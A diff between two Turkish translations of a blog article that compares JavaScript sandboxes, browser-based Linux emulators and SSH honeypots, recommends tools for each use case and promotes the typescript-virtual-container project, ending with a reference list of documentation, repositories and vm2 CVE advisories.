-| **İkili uyumluluk** | yok | yok | yok | ✅ | ✅ | kısmi | yok | ❌ |
-| **Başlatma süresi** | anında | anında | anında | 15–40s | 15–40s | 2–5s | anında | <1s |
-| **RAM/örnek** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
-| **Çalışma zamanı bağımlılıkları** | 0 | 1 (yerel) | 1 (Wasm) | 0 | özel | 1 | Python bağ. | 3 (ssh2, ws, fflate) |
+| **Yerel Node.js** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
+| **Tipli API** | temel | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ eksiksiz |
+| **İkili uyumluluk** | uygulanamaz | uygulanamaz | uygulanamaz | ✅ | ✅ | kısmi | uygulanamaz | ❌ |
+| **Başlatma süresi** | anlık | anlık | anlık | 15-40 sn | 15-40 sn | 2-5 sn | anlık | <1 sn |
+| **RAM/örnek** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
+| **Çalışma bağımlılıkları** | 0 | 1 (yerel) | 1 (Wasm) | 0 | sahipli | 1 | Python bağımlılıkları | 3 (ssh2, ws, fflate) |
 | **Durum** | kararlı | ✅ aktif | ✅ aktif | ✅ çok aktif | ticari | ✅ aktif | ✅ aktif | ✅ aktif |
 
 ---
 
-## Ne zaman hangisine başvurmalı
+## Ne zaman ne kullanılmalı
 
-**Güvenilmeyen JavaScript çalıştırman gerekiyor -- kullanıcı tarafından gönderilen bir formül, bir eklenti, bir script kancası.**  
-→ `isolated-vm`. Gerçek V8 Isolate, sert bellek limitleri, açık iletişim köprüsü. `vm2`'den kaçının -- CVE listesi büyümeye devam ediyor, cidden her birkaç ayda bir yenisi çıkıyor. `vm`'den kaçının -- hiç sandbox değil, lütfen.
+**Güvenilmez JavaScript çalıştırmalısın: kullanıcıca gönderilen formül, eklenti, script kancası.**
+→ `isolated-vm`. Gerçek V8 Isolate, sıkı bellek limitleri, açık iletişim köprüsü. `vm2`den kaçın: CVE listesi uzamaya devam eder, cidden birkaç ayda bir yeni. `vm`den kaçın: bu hiç kum havuzu değil, lütfen.
 
-**JS'yi sandbox'a alman gerekiyor ama yerel bir eklenti istemiyorsun veya tarayıcı uyumluluğuna ihtiyacın var.**  
-→ `quickjs-emscripten`. Wasm sınırı, ~500 KB modül, tarayıcı ve Node'da çalışır. V8'den yavaş ama gerçekten izole.
+**JSyi izole etmelisin ve yerel uzantı istemiyorsun ya da tarayıcı uyumluluğu gerekir.**
+→ `quickjs-emscripten`. Wasm sınırı, ~500 KB modül, tarayıcı ve Nodeda çalışır. V8den yavaş ama gerçekten izole.
 
-**Gerçek, değiştirilmemiş bir Linux işletim sistemini ikili uyumlulukla başlatman gerekiyor.**  
-→ 32-bit Linux için `v86` veya mevcut bir Docker imajın varsa `container2wasm`. 150 MB+ RAM ve 30 saniyelik başlatmayı kabul et, bu anlaşma böyle. 64-bit'e ihtiyacın varsa, CheerpX'e bak veya sadece gerçek bir konteyner çalışma zamanı kullan.
+**Değiştirilmemiş gerçek Linux işletim sistemi başlatmalısın, ikili uyumlulukla.**
+→ 32-bit Linux için `v86` ya da mevcut Docker imajın varsa `container2wasm`. 150+ MB RAM ve 30 saniye başlatmayı kabul et, anlaşma bu. 64-bit gerekirse CheerpXe bak ya da sadece gerçek konteyner çalışma ortamı kullan.
 
-**Bir web uygulamasına backend olmadan Linux benzeri bir terminal gömmek istiyorsun.**  
-→ `v86` (tam işletim sistemi, ağır, başlaması yavaş) veya `typescript-virtual-container`'ın tarayıcı paketi (simülatör, daha hafif, anında başlatma, tam bir masaüstü için `startxfce4` içerir ki bu oldukça havalı ngl).
+**Web uygulamasına backendsiz Linux benzeri terminal gömmelisin.**
+→ `v86` (tam işletim sistemi, ağır, yavaş başlar) ya da `typescript-virtual-container` tarayıcı paketi (simülatör, daha hafif, anlık başlar, tam masaüstü için `startxfce4` içerir ki bu epey havalı).
 
-**Etkileşimli çevrimiçi kodlama eğitimleri veya tarayıcı IDE'sine ihtiyacın var.**  
-→ Node.js ekosistemi odaklıysan WebContainers. Gerçek bir Linux kullanıcı alanına ihtiyacın varsa CheerpX. Daha hafif bir seçenek ve tipli bir API istiyorsan `typescript-virtual-container`'ın tarayıcı paketi.
+**Çevrimiçi etkileşimli kodlama öğreticileri ya da tarayıcı IDE gerekir.**
+→ Node.js ekosistemine odaklıysan WebContainers. Gerçek Linux kullanıcı alanı gerekirse CheerpX. Tipli APIli daha hafif seçenek istersen `typescript-virtual-container` tarayıcı paketi.
 
-**SSH saldırgan TTP'lerini ölçekli olarak toplamak istiyorsun.**  
-→ Cowrie production standardıdır, nokta. Herhangi bir Linux sunucusunda çalışır, her SIEM ile entegre olur, artık LLM modu var. Sadece Cowrie kullan.
+**SSH saldırgan TTPlerini büyük ölçekte toplamak istiyorsun.**
+→ Cowrie üretim standardıdır, nokta. Herhangi Linux sunucuda döner, tüm SIEMlerle bütünleşir, artık LLM modu vardır. Sadece Cowrie kullan.
 
-**Bir Node.js uygulamasında programatik API ile SSH honeypot verisi istiyorsun.**  
-→ `typescript-virtual-container`. Komutlar gerçekten yürütülür. VFS, snapshot'ını alıp diff'ini yapabileceğin gerçek bir veri yapısıdır. Saldırgan inandırıcı, etkileşimli bir ortam alır ve sen Node'dan ayrılmadan yapılandırılmış denetim verisi alırsın.
+**Programlanabilir APIli Node.js uygulamasında SSH honeypot verileri istiyorsun.**
+→ `typescript-virtual-container`. Komutlar gerçekten çalışır. VFS anında yakalayıp karşılaştırabileceğin gerçek veri yapısıdır. Saldırgan ikna edici etkileşimli ortam alır ve sen Node çıkmadan yapılandırılmış denetim verileri alırsın.
 
-**Docker olmadan CI'da shell otomasyonu / testi yapman gerekiyor.**  
-→ `typescript-virtual-container`. Bir saniyeden kısa sürede başlat, testten önce snapshot al, sonra geri yükle. Tipli API ile shell komutları çalıştır. Docker daemon'u yok, çekirdek yok, VM yok, bekleme yok.
+**Dockersız CI otomasyon kabuğu / testleri gerekir.**
+→ `typescript-virtual-container`. Bir saniyeden kısa başlar, testten önce anlık görüntü al, sonra geri yükle. Tipli API ile kabuk komutları çalıştır. Docker daemonu yok, çekirdek yok, VM yok, bekleme yok.
 
-**Çok kiracılı shell ortamlarına ihtiyacın var (SaaS, eğitim, öğretim).**  
-→ `typescript-virtual-container`. Örnek başına 5–20 MB, emülatör için 150–256 MB'a karşı. 100 eşzamanlı kullanıcı: ~2 GB'a karşı ~25 GB. Barındırma maliyetlerinde büyük fark!
+**Çok kiracılı kabuk ortamları gerekir (SaaS, eğitim, öğretim).**
+→ `typescript-virtual-container`. Örnek başına 5-20 MB ve emülatör için 150-256 MB karşılaştırması. 100 eşzamanlı kullanıcı: ~2 GB ve ~25 GB karşılaştırması. Barındırma maliyetlerinde büyük fark!
 
-**Aynı zamanda çoklu VM ağ laboratuvarı inşa etmene izin veren gerçekçi bir honeypot'a ihtiyacın var.**  
-→ `typescript-virtual-container` bu alanda ikisini de yapan tek şey.
-
----
-
-## Yapamadığı şeyler (ve bu konuda dürüst olmak istiyorum)
-
-Yerel x86 ikili dosyalarını çalıştıramaz. C kodu derlemen, gerçek bir Python yorumlayıcı çalıştırman veya Linux için derlenmiş yazılım kullanman gerekiyorsa, bu syscall'ları destekleyecek bir çekirdek ABI'si yoktur. `gcc`, `python3` ve `node` gibi komutlar taslaktır -- `--version` ve yaygın kullanımlara yanıt verirler, ancak gerçek bir şey yürütmezler.
-
-Bu temel takastır: 10–50 kat daha düşük bellek, anında başlatma, tarayıcı uyumluluğu, tipli bir API, gerçek SSH ve sanal ağ kazanırsın -- ve Linux kullanıcı alanıyla ikili uyumluluktan vazgeçersin.
-
-Fortune, projeyi tasarlarken bunu çok düşündü. Hedeflediği kullanım durumları için -- honeypot'lar, test, gömülü terminaller, CI ortamları -- derlenmiş bir ikili dosyayı çalıştırmak aslında asla gerekmez. Shell pipeline'ları, dosya manipülasyonu, ağ yönlendirmesi ve SSH her şeyi kapsar. Ancak kullanım durumun gerçek derlenmiş yazılım gerektiriyorsa, `v86` veya Docker doğru cevaptır, bu değil.
+**Çok VMli ağ laboratuvarı da kurmaya izin veren gerçekçi honeypot gerekir.**
+→ `typescript-virtual-container`, bu alanda ikisini de yapan tek şeydir.
 
 ---
 
-## Toparlarken
+## Yapamadığı şey (ve burada dürüst olmak isterim)
 
-Veeeee evet. Bu ekosistem, dışarıdan göründüğünden daha geniş ve daha parçalanmış. `vm` bir kapsam ayırıcıdır, sandbox değil. `vm2` CVE biriktirmeye devam ediyor (cidden, bu ayın danışma notlarını kontrol et). `isolated-vm` doğru JS sandbox'lama cevabıdır ama sadece JS. `quickjs-emscripten`, tarayıcı uyumluluğuna ihtiyacın olduğunda veya yerel eklentilerden kaçınmak istediğinde doğru seçimdir. `v86` ve CheerpX, gerçek ikili uyumluluğa ihtiyacın olduğunda gerçek emülatörlerdir. WebContainers, Wasm'de Node.js'dir, genel bir Linux ortamı değil. Cowrie, SSH honeypot altın standardıdır ama Python'dur ve Node-yerel değildir.
+Yerel x86 ikilileri çalıştıramaz. C kodu derlemen, gerçek Python yorumlayıcı çalıştırman ya da Linux için derlenmiş yazılım kullanman gerekirse bu sistem çağrılarını destekleyecek çekirdek ABI yoktur. `gcc`, `python3` ve `node` gibi komutlar saplamadır: `--version` ve yaygın çağrılara yanıt verir ama gerçek bir şey çalıştırmaz.
 
-Ve sonra `typescript-virtual-container` var -- Fortune'un projesi -- kendi kategorisinde yaşayan bir şey. Bir emülatör değil, bir JS sandbox'ı değil, pasif bir honeypot değil. Hepsinin arasında, diğerlerinin hiçbirinin yapamadığı birçok şey için şaşırtıcı derecede kullanışlı olduğu ortaya çıkan bir şey.
+Bu temel takastır: 10 ila 50 kat az bellek, anlık başlatma, tarayıcı uyumluluğu, tipli API, gerçek SSH ve sanal ağ kazanırsın ve Linux kullanıcı alanıyla ikili uyumluluktan vazgeçersin.
 
-`typescript-virtual-container`, diğerlerinin hiçbirinin dokunmadığı boşluğu doldurur: gerçek SSH, SFTP, POSIX izinleri, kullanıcı yönetimi, sanal ağ ve tipli bir TypeScript API ile ~10 MB'da çalışan, bir saniyeden kısa sürede başlayan, hem Node.js'de hem de tarayıcıda çalışan eksiksiz, programatik bir Linux shell ortamı.
+Fortune projeyi tasarlarken bunu çok düşündü. Hedeflediği kullanım durumları için: honeypotlar, testler, gömülü terminaller, CI ortamları, derlenmiş ikili çalıştırmak aslında hiç gerekli değildir. Kabuk pipeları, dosya manipülasyonu, ağ yönlendirme ve SSH her şeyi kapsar. Ama kullanım durumun gerçek derlenmiş yazılım gerektiriyorsa `v86` ya da Docker doğru yanıttır, bu değil.
 
-Denemek istersen: kaynak [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) adresinde ve tam bir masaüstü için `startxfce4` de dahil canlı bir demo (ki bu cidden hasta) [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo) adresinde. Git bir göz at ve Fortune'a GitHub'da biraz yıldız ver, bunu hak ediyor!
+---
 
-Okuduğun için teşekkürler -- bu benim standartlarıma göre bile çok uzundu :) umarım faydalı olmuştur!
+## Sonuç olarak
+
+İşte böyle. Bu ekosistem dışarıdan göründüğünden daha geniş ve daha parçalıdır. `vm` kapsam ayırıcıdır, kum havuzu değil. `vm2` CVE biriktirmeye devam eder (gerçekten, bu ayki uyarılara bak). `isolated-vm` JS izolasyonu için doğru yanıttır ama yalnızca JS. `quickjs-emscripten`, tarayıcı uyumluluğu gerekince ya da yerel uzantılardan kaçınmak isteyince doğru seçimdir. `v86` ve CheerpX gerçek ikili uyumluluk gerekince gerçek emülatörlerdir. WebContainers Wasmde Node.jsdir, genel Linux ortamı değil. Cowrie SSH honeypotlarının altın standardıdır ama Python ve yerel Node değildir.
+
+Ve sonra biraz kendi kategorisinde yaşayan Fortune projesi `typescript-virtual-container` vardır. Ne emülatör, ne JS kum havuzu, ne pasif honeypot. Arada bir şey ve diğerlerinin hiçbirinin yapamadığı birçok şey için şaşırtıcı faydalı olduğu ortaya çıktı.
+
+`typescript-virtual-container`, diğerlerinin hiçbirinin dokunmadığı boşluğu doldurur: gerçek SSH, SFTP, POSIX izinleri, kullanıcı yönetimi, sanal ağ ve tipli TypeScript APIli tam programlanabilir Linux kabuk ortamı: yaklaşık 10 MB içinde döner, bir saniyeden kısa başlar, hem Node.js hem tarayıcıda çalışır.
+
+Denemek istersen: kaynak kodu [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) adresindedir ve çevrimiçi demo (tam masaüstü için `startxfce4` dahil ki bu düpedüz hastadır) [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo) adresindedir. Göz at ve GitHubda Fortunea birkaç yıldız bırak, hak eder!
+
+Okuduğun için teşekkürler: bu standartlarıma göre bile uzundu :) umarım faydalı olmuştur!
 
 ---
 
 ## Kaynaklar
 
-Her iddiayı bir birincil kaynağa bağlamaya çalıştım -- CVE danışma notları, resmi dokümanlar, GitHub repoları, bakımcıların blog yazıları. Birkaç not: vm2 CVE listesi büyümeye devam ediyor, bu yüzden FortiGuard bağlantısı bunu okuduğun zamana kadar güncelliğini kaybetmiş olabilir (en sonuncusu için GitHub danışma sayfasını kontrol et). Bellard bağlantılarının hepsi kararlıdır -- kişisel sitesi sonsuza kadar açıktır ve içerik değişmez. Ve polyfill'ler hakkında daha derine inmek istersen, doğrudan `typescript-virtual-container` reposundaki `polyfills/` klasörüne göz at -- burada yazabileceğim herhangi bir açıklamadan daha okunabilir.
+Her iddiayı birincil kaynağa bağlamaya çalıştım: CVE uyarıları, resmi belgeler, GitHub depoları, bakıcıların blog yazıları. Birkaç not: vm2 CVE listesi uzamaya devam eder o yüzden bunu okuduğunda FortiGuard bağlantısı eskimiş olabilir (en güncel için GitHub uyarı sayfasına bak). Bellard bağlantıları hep kararlıdır: kişisel sitesi hep oradadır ve içerik değişmez. Ve polyfillerin birine derinleşmek istersen depoda `polyfills/` klasörüne doğrudan göz atman yeter: burada yazabileceğim herhangi açıklamadan daha okunurdur.
 
-### JavaScript sandbox'ları
+### JavaScript kum havuzları
 
-- **Node.js `vm` modülü** -- resmi dokümantasyon: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
-- **Node.js `vm` güvenlik uyarısı** -- "vm modülü bir güvenlik mekanizması değildir. Güvenilmeyen kodu çalıştırmak için kullanmayın": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
-- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
-- **vm2 CVE zaman çizelgesi** -- FortiGuard salgın uyarısı, tam CVE listesi ve tarihlerle: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
-- **CVE-2023-29017** -- async hata yığını kaçışı, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
-- **CVE-2023-32314** -- Proxy + Error.name + Function kaçışı, PoC gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
-- **CVE-2023-37466** -- Exploit DB girişi, tam PoC ile: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
-- **vm2 2026 CVE'leri** -- 11 yeni sandbox kaçışı, analiz: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
-- **"JS'yi JS'de Sandbox'a Alma Neden Zordur"** -- oxeye.io'nun CVE-2022-36067 otopsisi: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
-- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
-- **V8 Isolate iç yapısı** -- gömme rehberi: [v8.dev/docs/embed](https://v8.dev/docs/embed)
-- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
-- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
-- **QuickJS motoru** -- Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
-- **Deno izin modeli** -- doküman: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
-- **Deno 2 sürümü** -- Ekim 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
-- **TC39 ShadowRealm teklifi** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
-- **TC39 Compartments teklifi** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
-- **"JavaScript Kodunu Sandbox'a Alma"** -- Andrew Healey'in Deno sandbox yaklaşımı hakkında pratik yazısı: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)
+- **Node.js `vm` modülü**: resmi belgeleme: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
+- **Node.js `vm` güvenlik uyarısı**: "vm modülü bir güvenlik mekanizması değildir. Güvenilmez kod çalıştırmak için kullanmayın": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
+- **`vm2`**: npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
+- **vm2 CVE kronolojisi**: tüm CVE ve tarihli FortiGuard Uyarısı: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
+- **CVE-2023-29017**: asenkron hatayla kaçış, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
+- **CVE-2023-32314**: Proxy + Error.name + Function kaçışı, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
+- **CVE-2023-37466**: PoC eksiksiz Exploit DB girdisi: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
+- **2026 vm2 CVE**: 11 yeni kaçış, analiz: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
+- **"Why Sandboxing JS in JS is Hard"**: CVE-2022-36067 üzerine oxeye.io ölüm sonrası: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
+- **`isolated-vm`**: npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
+- **V8 Isolate içselleri**: Gömme Kılavuzu: [v8.dev/docs/embed](https://v8.dev/docs/embed)
+- **`quickjs-emscripten`**: npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
+- **`@sebastianwessel/quickjs`**: npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
+- **QuickJS motoru**: Fabrice Bellard imzalı: [bellard.org/quickjs](https://bellard.org/quickjs/)
+- **Deno izin modeli**: belgeler: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
+- **Deno 2 çıkışı**: Ekim 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
+- **TC39 ShadowRealm önerisi**: [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
+- **TC39 Compartments önerisi**: [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
+- **"Sandboxing JavaScript Code"**: Andrew Healeyden Deno kum havuzu yaklaşımına pratik makale: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)
 
 ### Linux emülatörleri
 
-- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
-- **v86 işletim sistemi destek matrisi** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
-- **SeaBIOS** (v86 tarafından kullanılan BIOS) -- [seabios.org](https://www.seabios.org/SeaBIOS)
-- **Bochs VBE uzantıları** (VGA referansı) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
-- **JSLinux** -- Bellard'ın emülatörü: [bellard.org/jslinux](https://bellard.org/jslinux/) · Teknik notlar (TinyEMU, tarihçe, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
-- **TinyEMU** -- C kaynağı: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Gayriresmi GitHub yansıları: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
-- **jor1k** -- OpenRISC JS emülatörü: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
-- **CheerpX** -- doküman: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads rehberi: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
-- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API dokümanı: [webcontainers.io](https://webcontainers.io) · Duyuru: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ genel bakış: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
-- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT blog yazısı: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison yazısı: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)
+- **`v86`**: npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
+- **v86 işletim sistemi destek matrisi**: [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
+- **SeaBIOS** (v86 kullandığı BIOS): [seabios.org](https://www.seabios.org/SeaBIOS)
+- **Bochs VBE uzantıları** (VGA başvurusu): [bochs.sourceforge.io](https://bochs.sourceforge.io/)
+- **JSLinux**: Bellard emülatörü: [bellard.org/jslinux](https://bellard.org/jslinux/) · Teknik notlar (TinyEMU, tarihçe, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
+- **TinyEMU**: C kaynağı: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Resmi olmayan GitHub aynaları: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
+- **jor1k**: JS OpenRISC emülatörü: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
+- **CheerpX**: belgeler: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads kılavuzu: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
+- **WebContainers**: npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API Belgeleri: [webcontainers.io](https://webcontainers.io) · Duyuru: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ önizleme: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
+- **container2wasm**: GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT blog yazısı: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison yazısı: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)
 
 ### Terminal yığını
 
-- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
-- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)
+- **xterm.js**: npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
+- **node-pty**: npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)
 
-### Honeypot'lar
+### Honeypotlar
 
-- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Doküman: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
-- **Kippo** -- GitHub (arşivlenmiş): [github.com/desaster/kippo](https://github.com/desaster/kippo)
-- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
-- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
-- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
-- **node-simple-ssh-honeypot** -- minimal Node.js SSH honeypot: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
-- **awesome-honeypots** -- düzenlenmiş liste: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
-- **MITRE ATT&CK T1082** -- Sistem Bilgisi Keşfi (saldırganların honeypot'ları nasıl parmak iziyle tespit ettiği): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)
+- **Cowrie**: GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Belgeler: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
+- **Kippo**: GitHub (arşivli): [github.com/desaster/kippo](https://github.com/desaster/kippo)
+- **endlessh**: GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
+- **sshesame**: GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
+- **Lyrebird**: Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
+- **node-simple-ssh-honeypot**: Minimal Node.js SSH Honeypotu: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
+- **awesome-honeypots**: Düzenlenmiş liste: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
+- **MITRE ATT&CK T1082**: Sistem bilgisi keşfi (saldırganlar honeypotları nasıl tanımlar): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)
 
 ### `typescript-virtual-container`
 
 - **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
 - **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
-- **Canlı demo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
-- **Mimari rehberi**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
-- **`ssh2`** (SSH protokol uygulaması) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
